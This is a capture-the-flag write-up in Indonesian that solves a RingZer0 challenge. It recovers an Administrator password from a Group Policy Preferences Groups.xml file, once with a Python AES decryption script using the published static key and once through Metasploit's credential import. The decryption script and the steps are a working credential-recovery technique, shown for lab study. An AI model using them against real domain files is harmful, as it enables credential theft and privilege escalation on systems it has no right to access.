<h1><b>I Lost my password can you find it?</h1></b>
<pre>
<a href="https://ringzer0ctf.com/files/329d7767b42f3d8e9f498e98fbabc83c.zip">File</a>
</pre>
</b><h3>Solution</h3></b>
<p>Kita diminta untuk mencari password pada file GPP(Group Policy Preferences), dan dengan perintah grep saya mendapatkan password ter-encrypt pada file configurasi xml</p>

```console
root@Python:/home/venom/Downloads/Policies# grep -iR password
{75DE8F0A-DEC0-441F-AE29-90DFAFCF632B}/User/Preferences/Groups/Groups.xml:<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)" image="1" changed="2014-02-06 19:33:28" uid="{C73C0939-38FB-4287-AC48-478F614F5EF7}" userContext="0" removePolicy="0"><Properties action="R" fullName="Administrator" description="Administrator" cpassword="PCXrmCkYWyRRx3bf+zqEydW9/trbFToMDx6fAvmeCDw" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" subAuthority="" userName="Administrator (built-in)"/></User>
root@Python:/home/venom/Downloads/Policies# 
```
<p>encrypt password berupa encoding base64 yaitu <b>PCXrmCkYWyRRx3bf+zqEydW9/trbFToMDx6fAvmeCDw</b>, sekarang untuk kuncinya disini saya melakukan searching dan terdapat pada 
<a href="https://www.pentestpartners.com/security-blog/abusing-group-policy-preferences-to-elevate-privileges/">website</a> ini, 
dijelaskan bahwa service ini mengunakan encryption AES-CBC dengan 1 kunci yang sifatnya sama semuanya yaitu <b>4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b</b></p>

```python
import base64
from Crypto.Cipher import AES

encrypt_base64 = "PCXrmCkYWyRRx3bf+zqEydW9/trbFToMDx6fAvmeCDw"
decod = base64.b64decode(encrypt_base64+"=")
key = "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b".decode('hex')
iiv = "00000000000000000000000000000000".decode("hex")
cipher = AES.new(key,AES.MODE_CBC,iiv)
flag = cipher.decrypt(decod)
print(flag)
```
<p>Dan hasilnya</p>
<pre>
L��o��c��a��l��R��o��o��t��!��
</pre>
<p>Kita mendapatkan string LocalRoot! untuk flag, dan dibawah ini cara simplenya dengan tool metasplot</p>

```console
root@Python:/home/venom/Downloads# service postgresql start
root@Python:/home/venom/Downloads# msfdb init
Metasploit running on Kali Linux as root, using system database
A database appears to be already configured, skipping initialization
root@Python:/home/venom/Downloads# msfconsole 
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v5.0.100-dev-                        ]
+ -- --=[ 2045 exploits - 1106 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View a module's description using info, or the enhanced version in your browser with info -d

msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
msf5 > db_import Groups.xml
[*] Importing 'Group Policy Preferences Credentials' data
[*] Successfully imported /home/venom/Downloads/Groups.xml
msf5 > creds
Credentials
===========

host  origin  service  public                    private     realm  private_type  JtR Format
----  ------  -------  ------                    -------     -----  ------------  ----------
                       Administrator (built-in)  LocalRoot!         Password      

msf5 > 
```
</b><h3>Flag</h3></b>
<pre>
LocalRoot!
</pre>
